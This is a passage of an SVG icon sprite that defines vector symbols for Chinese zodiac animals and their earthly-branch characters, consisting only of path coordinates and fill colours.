m-21.180632-623.104L493.136842 362.792421l137.889684-137.889684 38.103579 38.103579-137.889684 137.889684z m-126.760421-18.351158l-38.103579-38.103579 152.980211-152.98021 38.103579 38.103579-152.980211 152.98021z m282.004211-218.624c15.494737-9.754947 43.331368-31.447579 43.331368-31.447579-25.734737-27.809684-49.556211-33.333895-67.368421-29.07621-19.240421 4.608-37.753263 24.602947-37.753263 24.602947s42.253474 22.447158 61.790316 35.920842z" fill="#231F20" ></path></symbol><symbol id="icon-horse" viewBox="0 0 1024 1024"><path d="M776.003368 646.736842c16.599579-99.947789 43.439158-181.086316 83.213474-256.538947l6.817684-12.934737H269.473684c-36.756211 0-53.894737 54.945684-53.894737 92.05221 0 46.753684 6.656 77.527579 70.278737 176.074106l84.533895 128.269473L498.876632 646.736842h277.126736z" fill="#FFAF6E" ></path><path d="M1024 0v404.210526c0 33.333895 0 134.736842-92.079158 134.736842h-13.824l-78.362947-109.056c-22.743579 49.906526-40.340211 103.046737-53.490527 162.950737h115.092211C937.310316 592.842105 970.105263 625.637053 970.105263 661.638737c0 60.631579-69.389474 154.300632-77.312 164.75621l-43.008-32.471579C875.466105 759.861895 916.210526 693.813895 916.210526 661.638737c0-5.982316-8.919579-14.901895-14.901894-14.901895h-125.332211C761.128421 736.121263 754.526316 840.569263 754.526316 970.105263h-53.894737c0-283.971368 31.097263-453.605053 110.888421-605.049263l20.318316-38.534737 112.801684 156.995369c14.443789-4.419368 25.465263-20.938105 25.465263-79.306106V0h53.894737z m-161.684211 161.684211h53.894737V0h-53.894737v80.842105c-17.381053-14.955789-38.184421-26.947368-80.842105-26.947368h-134.736842v53.894737h134.736842c37.672421 0 80.842105 40.906105 80.842105 53.894737z m-107.789473 0h-215.578948v53.894736h161.684211l53.894737-53.894736zM300.894316 766.544842L400.680421 916.210526h64.754526l-95.043368-142.551579L498.876632 646.736842h167.855157a1212.631579 1212.631579 0 0 1 9.431579-53.894737h-199.383579l-175.885473 173.702737z m109.97221-184.400842l-37.861052-38.319158-132.419369 130.802526C173.729684 571.095579 161.684211 529.812211 161.684211 469.315368 161.684211 398.578526 199.464421 323.368421 269.473684 323.368421h323.368421l53.894737-53.894737H269.473684c-6.709895 0-13.258105 0.565895-19.698526 1.482105C234.927158 249.451789 204.638316 215.578947 160.633263 215.578947 65.967158 215.578947 0 349.291789 0 469.315368c0 70.170947 16.141474 136.650105 49.232842 202.671158L6.197895 723.833263l41.472 34.41179 66.128842-79.737264-8.704-16.033684C83.105684 622.133895 53.894737 558.214737 53.894737 469.315368 53.894737 368.451368 106.765474 269.473684 160.633263 269.473684c13.231158 0 25.815579 9.889684 35.43579 20.533895C142.874947 321.967158 107.789474 388.500211 107.789474 469.315368c0 78.201263 19.698526 130.937263 93.642105 243.981474l-55.296 54.622316L280.899368 970.105263h64.754527l-130.048-195.072 195.260631-192.889263z" fill="#231F20" ></path></symbol><symbol id="icon-monkey_shen" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#BBC4C9" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-431.157895 134.736842h161.684211v53.894737h53.894737V269.473684h-215.578948V161.684211h-53.894736v107.789473h-215.578948v431.157895h53.894737v-53.894737h161.684211v215.578947h53.894736v-215.578947z m0-161.68421h161.684211v107.789473h-161.684211v-107.789473z m-215.578947 0h161.684211v107.789473h-161.684211v-107.789473z m215.578947-161.684211h161.684211v107.789474h-161.684211v-107.789474z m-215.578947 0h161.684211v107.789474h-161.684211v-107.789474z" fill="#231F20" ></path></symbol><symbol id="icon-ox_chou" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#D6B196" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-161.68421 188.631579h-159.555369c13.985684-172.813474 43.115789-357.429895 70.817684-385.158737L700.631579 269.473684H323.368421v53.894737h107.169684c-1.940211 45.756632-8.192 103.962947-15.76421 161.684211H323.368421v53.894736h83.968c-9.862737 68.446316-20.264421 130.128842-25.734737 161.684211H215.578947v53.894737h592.842106v-53.894737z m-346.543158-161.684211h149.800421a3313.717895 3313.717895 0 0 0-16.842105 161.684211h-158.477474c6.036211-35.247158 16.114526-95.636211 25.519158-161.684211z m22.608842-215.578947h171.735579c-15.198316 41.121684-27.405474 100.594526-36.890948 161.684211h-150.123789c7.383579-57.505684 13.419789-115.361684 15.279158-161.684211z" fill="#231F20" ></path></symbol><symbol id="icon-monkey" viewBox="0 0 1024 1024"><path d="M757.733053 485.052632H565.894737a80.842105 80.842105 0 0 0-80.842105 80.842105v215.578947c0 40.96 43.546947 99.678316 77.446736 139.210105C596.426105 960.215579 603.055158 970.105263 603.055158 970.105263H754.526316s15.144421-18.674526 45.891368-58.071579S862.315789 809.984 862.315789 717.608421c0-89.573053-47.993263-166.346105-104.582736-232.555789z" fill="#C3D686" ></path><path d="M538.947368 1024h-53.894736c0-32.794947 25.869474-87.417263 77.446736-103.316211C528.599579 881.152 485.052632 822.433684 485.052632 781.473684c0-44.570947 36.271158-80.842105 80.842105-80.842105h80.842105v53.894737h-80.842105a26.947368 26.947368 0 0 0-26.947369 26.947368c0 19.725474 36.675368 77.473684 92.133053 134.736842h88.602947c20.210526-14.147368 88.737684-71.464421 88.737685-198.602105 0-108.382316-93.237895-202.967579-168.151579-278.986105-49.502316-50.202947-88.576-89.842526-98.735158-128.61979-11.749053-44.732632-21.584842-112.586105-26.327579-148.318315H377.263158c-45.136842 0-89.519158 8.434526-121.802105 53.894736H431.157895v53.894737c-97.28 0-107.789474 113.071158-107.789474 161.684211v53.894737h53.894737v161.68421h-53.894737v-107.789474h-26.947368c-170.253474 0-188.631579-94.234947-188.631579-134.736842 0-31.043368 35.220211-72.326737 55.727158-93.722947 2.694737-14.686316 5.847579-28.348632 9.431579-41.013895H161.684211V215.578947h31.528421C239.642947 120.993684 317.224421 107.789474 377.263158 107.789474h185.640421l2.802526 23.794526c0.134737 1.050947 12.719158 106.657684 27.944421 164.756211 6.494316 24.872421 44.624842 63.514947 84.965053 104.448C760.481684 483.813053 862.315789 587.129263 862.315789 717.608421c0 92.375579-31.124211 155.028211-61.898105 194.425263C904.919579 892.146526 970.105263 803.004632 970.105263 673.684211c0-91.405474-42.819368-154.381474-84.237474-215.255579C847.791158 402.458947 808.421053 344.576 808.421053 269.473684c0-119.349895 87.093895-161.684211 161.68421-161.68421v53.894737c-32.417684 0-107.789474 10.509474-107.789474 107.789473 0 58.502737 31.555368 104.933053 68.096 158.639158C974.282105 492.597895 1024 565.679158 1024 673.684211c0 177.286737-108.301474 296.421053-269.473684 296.421052h-161.684211c-37.672421 0-53.894737 40.906105-53.894737 53.894737zM229.214316 269.473684a384.808421 384.808421 0 0 0-14.012632 58.341053l-1.401263 8.488421-6.090105 6.117053c-22.878316 22.932211-44.813474 52.601263-46.026105 62.275368 0 56.805053 53.76 75.264 107.789473 79.386947V431.157895c0-58.691368 13.473684-119.619368 46.511158-161.684211h-86.770526zM323.368421 1024h-53.894737c0-32.794947 25.869474-87.417263 77.446737-103.316211C313.020632 881.152 269.473684 822.433684 269.473684 781.473684c0-44.570947 36.271158-80.842105 80.842105-80.842105h45.16379A188.847158 188.847158 0 0 1 565.894737 592.842105h134.736842v53.894737h-134.736842c-74.293895 0-134.736842 60.442947-134.736842 134.736842v26.516211l-53.894737 0.377263V781.473684c0-9.162105 0.646737-18.135579 1.913263-26.947368H350.315789c-14.848 0-26.947368 12.072421-26.947368 26.947368 0 19.725474 36.675368 77.473684 92.133053 134.736842H431.157895v53.894737h-53.894737c-37.672421 0-53.894737 40.906105-53.894737 53.894737z" fill="#231F20" ></path></symbol><symbol id="icon-horse_wu" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#FF8787" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-431.157895 26.947368h269.473685v-53.894736H538.947368v-161.684211h161.684211v-53.894737H411.001263c12.045474-33.28 20.156632-69.793684 20.156632-107.789473h-53.894737c0 121.963789-105.364211 233.391158-106.415158 234.496l38.858105 37.349052c2.883368-3.018105 43.816421-46.133895 77.392842-110.160842H485.052632v161.684211H215.578947v53.894736h269.473685v323.368421h53.894736V538.947368z" fill="#231F20" ></path></symbol><symbol id="icon-ox" viewBox="0 0 1025 1024"><path d="M540.294737 754.526316h215.578947c20.210526 0 35.112421 1.374316 53.894737 4.581052 91.863579 15.656421 145.354105 67.691789 161.684211 86.069895V916.210526h53.894736V635.580632l-7.895579-7.895579c-9.269895-9.269895-36.513684-49.232842-44.032-196.527158H540.294737a161.684211 161.684211 0 0 0-161.684211 161.68421v131.098948c43.304421 20.210526 97.28 30.585263 161.684211 30.585263z" fill="#FFAF6E" ></path><path d="M1025.347368 635.580632V916.210526h-53.894736v-71.033263c-16.330105-18.405053-69.820632-70.413474-161.684211-86.069895V916.210526h-53.894737v-161.68421h-107.789473v215.578947h-53.894737V700.631579h161.68421c100.998737 0 172.570947 38.669474 215.578948 71.868632v-115.738948c-33.684211-43.627789-51.712-137.458526-53.706106-279.498105H701.978947c-76.934737 0-127.218526-26.219789-175.804631-51.550316a1556.048842 1556.048842 0 0 0-26.839579-13.743158c-26.839579 26.004211-66.209684 44.921263-115.738948 55.511579 24.441263 22.986105 60.874105 52.116211 106.469053 72.838737l-22.312421 49.044211c-76.584421-34.816-129.589895-88.926316-150.824421-113.125053-10.644211 0.619789-21.477053 1.024-32.687158 1.024a473.734737 473.734737 0 0 1-123.365053-15.952842l-93.022315 186.314105 68.581052 53.86779C167.882105 579.557053 237.891368 538.947368 324.715789 538.947368v53.894737c-95.986526 0-170.361263 62.490947-171.088842 63.137684l-16.78821 14.282106-136.838737-107.358316 109.729684-219.809684C46.430316 314.448842 1.347368 267.371789 1.347368 199.868632 1.347368 89.815579 121.586526 53.894737 163.031579 53.894737v53.894737c-14.120421 0-107.789474 17.165474-107.789474 92.079158C55.242105 290.465684 192.188632 323.368421 284.240842 323.368421c67.907368 0 122.421895-12.988632 157.696-35.624421-42.711579-14.336-95.097263-23.120842-169.337263-18.324211l-3.503158-53.786947c95.878737-6.117053 160.148211 8.515368 211.429053 28.833684C484.244211 235.439158 486.4 225.818947 486.4 215.578947c0-48.855579-57.829053-76.288-58.394947-76.557473l22.393263-49.017263C454.063158 91.648 540.294737 131.826526 540.294737 215.578947c0 18.566737-3.422316 35.84-9.997474 51.631158 7.060211 3.584 13.985684 7.168 20.776421 10.698106C597.854316 302.322526 638.248421 323.368421 701.978947 323.368421h269.473685v26.947368c0 214.689684 35.220211 266.590316 45.999157 277.369264l7.895579 7.895579z m-729.384421 25.141894l-98.789052 118.541474 86.797473 137.835789 45.594948-28.725894-65.913263-104.690527 37.052631-44.43621C358.642526 785.192421 439.080421 808.421053 540.294737 808.421053v-53.894737c-99.893895 0-175.077053-24.549053-223.474526-72.946527l-20.857264-20.857263z" fill="#231F20" ></path></symbol><symbol id="icon-rabbit_mao" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#7DD47F" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-377.263158-188.631579h107.789474v323.368421c-20.48 0-39.936-11.264-40.016842-11.317895l-27.728842 46.214737c3.206737 1.940211 32.660211 18.997895 67.745684 18.997895 30.746947 0 53.894737-23.147789 53.894737-53.894737V269.473684h-215.578948v538.947369h53.894737V323.368421z m-107.789473 242.526316v-242.526316h-53.894737v196.904421l-107.789474 40.421053v-243.927579l169.094737-48.316632-14.821053-51.819789L269.473684 276.102737v304.801684l-36.405895 13.662316 18.917053 50.472421 178.741895-67.018105c-5.039158 69.928421-55.269053 106.981053-165.133474 122.933894l7.733895 53.328842C325.712842 746.657684 485.052632 723.536842 485.052632 565.894737z" fill="#231F20" ></path></symbol><symbol id="icon-rabbit" viewBox="0 0 1024 1024"><path d="M680.96 488.744421a1666.667789 1666.667789 0 0 0-54.433684-23.95621c-16.006737 12.234105-33.899789 20.264421-60.631579 20.264421h-80.842105c-36.810105 0-83.644632 30.396632-104.394106 67.772631-42.819368 77.123368-53.409684 117.813895-11.021473 201.701053C397.096421 808.879158 431.157895 876.409263 431.157895 970.105263h338.539789l68.338527-138.859789c20.129684-40.96 24.252632-73.701053 24.252631-110.349474 0.026947-57.397895-25.061053-159.717053-181.328842-232.151579z" fill="#FFBDD8" ></path><path d="M862.315789 720.896c0 36.621474-4.122947 69.389474-24.252631 110.349474L769.697684 970.105263H485.052632v-53.894737h48.370526C507.877053 880.074105 485.052632 833.509053 485.052632 781.473684c0-59.418947 24.171789-113.313684 63.218526-152.360421l38.103579 38.103579A161.091368 161.091368 0 0 0 538.947368 781.473684c0 54.784 35.381895 104.043789 63.514948 134.736842h133.712842l53.490526-108.759579c15.710316-31.851789 18.755368-55.834947 18.755369-86.554947 0-80.976842-63.434105-150.096842-178.607158-195.503158-17.542737 8.138105-38.292211 13.554526-63.919158 13.554526h-80.842105c-13.958737 0-43.924211 15.979789-57.290106 40.016843l-47.104-26.165895C401.408 515.449263 448.242526 485.052632 485.052632 485.052632h80.842105c37.268211 0 57.478737-15.440842 79.090526-36.45979C625.367579 336.195368 549.753263 269.473684 485.052632 269.473684h-107.789474a21.288421 21.288421 0 0 0-5.955369 2.021053A683.762526 683.762526 0 0 0 302.187789 194.021053c-35.84-34.223158-61.763368-58.933895-94.908631-79.440842A42.442105 42.442105 0 0 0 185.478737 107.789474a22.824421 22.824421 0 0 0-17.381053 7.194947c-10.913684 11.425684-6.063158 28.240842 1.428211 39.181474 21.989053 32.121263 47.912421 56.858947 83.752421 91.109052 20.614737 19.671579 49.259789 43.169684 77.392842 63.08379C281.007158 367.400421 215.578947 484.432842 215.578947 592.842105c0 74.482526 24.791579 124.065684 51.065264 176.586106C294.534737 825.209263 323.368421 882.903579 323.368421 970.105263h-53.894737c0-74.482526-24.791579-124.065684-51.065263-176.586105C190.517895 737.738105 161.684211 680.043789 161.684211 592.842105c0-90.866526 42.226526-197.685895 93.453473-274.485894a803.759158 803.759158 0 0 1-39.046737-34.115369C177.852632 247.754105 150.231579 221.399579 125.035789 184.616421c-24.441263-35.759158-22.797474-78.686316 4.069053-106.819368 26.300632-27.567158 70.898526-31.043368 106.522947-9.000421 37.941895 23.444211 65.562947 49.798737 103.774316 86.258526 9.970526 9.512421 33.037474 32.309895 56.93979 60.550737h68.634947c-27.621053-37.780211-60.416-72.730947-88.522105-99.543579-28.833684-27.540211-54.730105-52.116211-84.533895-74.024421L326.305684 0.296421c31.232 23.228632 57.802105 48.532211 87.309474 76.719158 53.840842 51.388632 94.450526 100.594526 121.74821 146.83621 82.836211 26.650947 150.042947 116.870737 165.025685 230.750316l1.724631 13.177263-9.404631 9.404632c-3.772632 3.772632-7.706947 7.653053-11.802948 11.587368C837.227789 561.178947 862.315789 663.498105 862.315789 720.896zM309.463579 754.526316c3.934316 8.057263 7.895579 16.087579 11.991579 24.144842C348.887579 832.970105 377.263158 889.128421 377.263158 970.105263h53.894737c0-93.696-34.061474-161.226105-61.520842-215.578947h-60.173474z m597.90821 53.894737c-3.422316 9.404632-7.814737 19.806316-13.770105 31.959579L829.790316 970.105263h60.065684l52.143158-105.957052c10.778947-21.935158 17.515789-40.016842 21.90821-55.727158h-56.535579zM514.694737 390.736842c0-34.223158-13.231158-44.463158-29.642105-44.463158s-29.642105 10.24-29.642106 44.463158c0 34.250105 13.231158 44.463158 29.642106 44.463158s29.642105-10.213053 29.642105-44.463158z" fill="#231F20" ></path></symbol><symbol id="icon-rat_zi" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#85C3DE" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-431.157895 188.631579v-215.578947h269.473685v-53.894737H538.947368v-39.585684c26.543158-18.081684 94.585263-65.050947 177.852632-127.488L700.631579 215.578947H323.368421v53.894737h295.316211a4221.008842 4221.008842 0 0 1-121.640421 85.369263l-11.991579 8.003369V431.157895H242.526316v53.894737h242.526316v215.578947c0 48.343579-13.850947 53.894737-134.736843 53.894737v53.894737c105.391158 0 188.631579 0 188.631579-107.789474z" fill="#231F20" ></path></symbol><symbol id="icon-rat" viewBox="0 0 1024 1024"><path d="M727.659789 431.157895c-132.581053 0-220.348632 47.454316-285.803789 154.354526-19.779368 32.309895-15.845053 76.503579-9.404632 96.579368 3.260632 10.159158 7.760842 18.647579 12.422737 25.546106C464.761263 737.010526 499.927579 754.526316 538.947368 754.526316h66.829474c1.158737 17.893053-1.967158 34.762105-15.144421 53.975579-12.692211 18.539789-37.807158 40.151579-56.32 54.810947 25.249684-0.673684 52.709053-0.997053 83.240421-0.997053C877.487158 862.315789 970.105263 711.922526 970.105263 571.176421 936.421053 512 882.364632 431.157895 727.659789 431.157895z" fill="#85C3DE" ></path><path d="M210.432 1012.897684l-43.573895-31.690105c106.954105-147.051789 185.317053-171.196632 423.828211-172.705684 21.396211-31.258947 16.249263-56.266105 9.377684-89.70779-3.557053-17.138526-7.221895-34.842947-7.221895-54.433684 0-68.958316 25.330526-104.636632 63.407158-136.973474l34.896842 41.040842c-29.453474 25.061053-44.409263 46.780632-44.409263 95.932632 0 14.093474 2.937263 28.402526 6.063158 43.546947 5.901474 28.510316 12.8 62.032842-1.131789 99.462737 166.373053-10.24 264.542316-96.902737 264.542315-236.193684C916.210526 418.330947 827.580632 323.368421 684.921263 323.368421c-83.644632 0-153.303579 29.696-174.187789 39.612632a224.875789 224.875789 0 0 1-20.533895 31.339789l-41.741474-34.115368 20.884211 17.057684-20.911158-16.976842C448.781474 359.828211 485.052632 314.287158 485.052632 262.736842c0-34.816-8.946526-60.766316-26.570106-77.069474-17.515789-16.249263-44.786526-24.602947-81.219368-24.953263V323.368421h-53.894737V109.783579l24.872421-1.913263c64.700632-4.931368 114.095158 7.895579 146.863158 38.238316C524.207158 173.056 538.947368 212.291368 538.947368 262.736842c0 11.102316-1.131789 21.908211-3.072 32.202105 37.268211-12.584421 89.842526-25.465263 149.045895-25.465263C858.165895 269.473684 970.105263 387.907368 970.105263 571.176421 970.105263 711.922526 877.487158 862.315789 617.552842 862.315789c-258.667789 0-311.942737 19.698526-407.120842 150.581895z m19.105684-256.835368c-12.045474 0-24.387368-0.565895-37.025684-1.64379l-22.096842-1.859368-2.425263-22.016C167.747368 728.144842 161.684211 672.444632 161.684211 631.026526c0-103.585684 21.450105-178.903579 53.894736-259.045052V107.789474h53.894737v274.782315l-2.021052 4.904422C235.439158 465.758316 215.578947 533.800421 215.578947 631.026526c0 22.878316 2.101895 51.442526 3.826527 70.979369 99.678316 2.802526 172.813474-35.408842 222.450526-116.493474l48.020211 24.090947c-11.237053 28.133053-11.371789 51.577263-0.377264 67.853474 9.701053 14.282105 28.645053 23.174737 49.448421 23.174737v53.894737c-39.019789 0-74.186105-17.515789-94.073263-46.888421a100.244211 100.244211 0 0 1-12.422737-25.546106c-53.221053 49.178947-121.128421 73.943579-202.913684 73.970527zM379.957895 525.473684c0-34.223158-13.231158-44.463158-29.642106-44.463158s-29.642105 10.24-29.642105 44.463158c0 34.250105 13.231158 44.463158 29.642105 44.463158s29.642105-10.213053 29.642106-44.463158z" fill="#231F20" ></path></symbol><symbol id="icon-rooster_you" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#BBC4C9" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-215.578947-188.631579h-161.684211v-26.947368h161.684211V242.526316H269.473684v53.894737h161.684211v26.947368h-161.684211v485.052632h53.894737v-53.894737h377.263158v53.894737h53.894737V323.368421zM323.368421 646.736842h377.263158v53.894737H323.368421v-53.894737z m0-269.473684h107.789474c0 103.316211-72.784842 107.654737-81.084632 107.789474L350.315789 538.947368c46.592 0 134.736842-33.792 134.736843-161.68421h53.894736v107.789474c0 29.722947 24.171789 53.894737 53.894737 53.894736h107.789474v53.894737H323.368421v-215.578947z m377.263158 0v107.789474h-107.789474v-107.789474h107.789474z m-215.578947-80.842105h53.894736v26.947368h-53.894736v-26.947368z" fill="#231F20" ></path></symbol><symbol id="icon-rooster" viewBox="0 0 1024 1024"><path d="M891.688421 506.421895C877.244632 455.033263 862.315789 401.893053 862.315789 323.368421V116.224l-323.368421 195.745684V323.368421c0 78.524632 14.928842 131.664842 29.372632 183.053474 12.611368 44.894316 24.522105 87.282526 24.522105 140.314947 0 101.618526-77.931789 176.693895-168.286316 203.991579l5.416422 11.587368h215.578947c24.333474 0 43.385263-0.242526 58.556631-2.128842C811.52 846.821053 916.210526 764.550737 916.210526 646.736842c0-53.032421-11.910737-95.420632-24.522105-140.314947z" fill="#FF8787" ></path><path d="M673.684211 354.357895c-16.384 0-29.642105-10.213053-29.642106-44.463158 0-34.223158 13.231158-44.463158 29.642106-44.463158s29.642105 10.24 29.642105 44.463158c0 34.250105-13.258105 44.463158-29.642105 44.463158zM540.106105 970.105263l-50.58021-107.789474h156.05221l50.607158 107.789474h59.553684l-51.60421-109.918316C811.52 846.821053 916.210526 764.550737 916.210526 646.736842c0-53.032421-11.910737-95.420632-24.522105-140.314947C877.244632 455.033263 862.315789 401.893053 862.315789 323.368421V107.789474c0-59.445895-48.343579-107.789474-107.789473-107.789474a107.924211 107.924211 0 0 0-107.789474 106.172632 100.890947 100.890947 0 0 0-24.117895-3.314527 88.710737 88.710737 0 0 0-88.602947 88.602948c0 20.668632 5.227789 39.720421 10.671158 53.921684l-99.489684 59.688421 93.749894 14.470737V377.263158c0 14.416842-5.901474 21.692632-33.360842 49.152l-11.129263 11.129263C398.228211 326.521263 324.985263 269.473684 215.740632 269.473684 96.768 269.473684 0 366.241684 0 485.214316V646.736842h53.894737v-161.522526A162.007579 162.007579 0 0 1 215.740632 323.368421c82.081684 0 140.422737 36.244211 240.64 152.252632l-38.615579 38.615579C367.804632 461.285053 323.098947 431.157895 259.584 431.157895A151.983158 151.983158 0 0 0 107.789474 582.952421V754.526316h53.894737v-171.573895A98.007579 98.007579 0 0 1 259.584 485.052632c46.322526 0 79.629474 20.911158 137.027368 86.016l18.970948 21.530947 128.080842-128.080842C572.200421 435.981474 592.842105 415.366737 592.842105 377.263158v-97.926737l23.309474-14.120421-13.662316-23.04c-0.161684-0.242526-14.578526-24.899368-14.578526-50.688 0-19.132632 15.575579-34.708211 34.70821-34.708211 5.093053 0 26.785684 3.179789 39.558737 18.647579l26.327579 46.026106 39.774316-24.090948-20.372211-49.367579C704.754526 140.449684 700.631579 117.517474 700.631579 107.789474c0-29.722947 24.171789-53.894737 53.894737-53.894737s53.894737 24.171789 53.894737 53.894737v215.578947c0 85.935158 16.680421 145.300211 31.366736 197.632C851.887158 564.008421 862.315789 601.141895 862.315789 646.736842c0 95.285895-99.408842 161.684211-188.631578 161.684211h-209.461895l-68.419369-145.704421C375.242105 618.954105 338.108632 592.842105 296.448 592.842105A80.976842 80.976842 0 0 0 215.578947 673.711158V862.315789h53.894737v-188.604631c0-14.874947 12.099368-26.974316 26.974316-26.974316 20.533895 0 38.965895 14.147368 50.553263 38.858105L480.579368 970.105263h59.526737z" fill="#231F20" ></path></symbol><symbol id="icon-snake_si" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#FF8787" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-242.041263 180.762947l-52.116211-13.797052C657.219368 749.864421 651.425684 754.526316 619.789474 754.526316h-242.526316V485.052632h269.473684v53.894736h53.894737V215.578947H323.368421v538.947369c0 29.722947 24.171789 53.894737 53.894737 53.894737h242.526316c77.689263 0 91.189895-51.065263 108.274526-115.658106zM377.263158 269.473684h269.473684v161.684211H377.263158v-161.684211z" fill="#231F20" ></path></symbol><symbol id="icon-tiger_yin" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#7DD47F" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-257.42821 299.250526l-107.789474-53.894737-24.117895 48.208843 107.789474 53.894736 24.117895-48.208842z m-269.473685-5.658947l-24.117894-48.208842-107.789474 53.894737 24.117895 48.208842 107.789473-53.894737zM700.631579 431.157895h-161.684211v-53.894737h107.789474v-53.894737H377.263158v53.894737h107.789474v53.894737h-161.684211v323.368421h53.894737v-53.894737h269.473684v53.894737h53.894737V431.157895z m-161.684211 161.68421h107.789474v53.894737h-107.789474v-53.894737z m-161.68421 0h107.789474v53.894737h-107.789474v-53.894737z m161.68421-107.789473h107.789474v53.894736h-107.789474v-53.894736z m-161.68421 0h107.789474v53.894736h-107.789474v-53.894736zM754.526316 215.578947h-223.097263l-20.803369-62.410105-51.119158 17.057684L474.624 215.578947H269.473684v107.789474h53.894737v-53.894737h377.263158v53.894737h53.894737V215.578947z" fill="#231F20" ></path></symbol><symbol id="icon-snake" viewBox="0 0 1024 1024"><path d="M107.789474 790.474105c0-72.434526 67.880421-91.513263 121.451789-91.513263 74.401684 0 153.815579 34.438737 237.891369 70.925474 50.580211 21.935158 104.609684 45.325474 162.250105 63.083789-52.412632 44.786526-118.784 74.347789-195.152842 83.078737-143.171368 16.357053-326.440421 7.006316-326.440421-125.574737zM377.263158 215.578947c-15.575579 0-30.288842 3.449263-43.654737 9.377685A250.691368 250.691368 0 0 0 323.368421 296.421053c0 115.550316 76.422737 169.391158 137.83579 212.614736 8.138105 5.712842 16.141474 11.371789 23.848421 17.057685V323.368421a107.789474 107.789474 0 0 